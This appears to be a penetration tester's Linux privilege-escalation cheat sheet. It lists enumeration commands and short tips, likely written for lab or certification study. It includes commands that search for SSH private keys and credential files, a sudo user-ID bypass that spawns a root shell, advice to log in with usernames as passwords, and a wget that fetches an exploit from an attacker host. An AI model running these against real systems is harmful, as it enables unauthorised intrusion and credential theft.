```shell
id

find / -group <groups> 2>/dev/null

history

sudo -l

sudo -V | grep version

find / -name id_rsa 2>/dev/null
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

find / -type f -perm -04000 -ls 2>/dev/null

ls -la /etc/passwd /etc/shadow /etc/security/opasswd

cat /etc/crontab
crontab -l

getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null

cat /etc/exports

sudo -u#-1 /bin/bash

ss -anp
routel
cat /etc/iptables/rules.v4

cat .bashrc

ps -aux
ps -aux | grep cron        <-- search for "root   /usr/sbin/cron -f"

realm list
ps -ef | grep -i "winbind\|sssd"

dpkg -l
```
1. Snoop on processes using pspy - some cron jobs may be running in the background
2. Research and enumerate literally every cron job running
3. su into other users using their usernames as passwords; vagrant:vagrant
4. Run PEAS and LinEnum
```shell 
wget 192.168.45.x/sudodoom
```
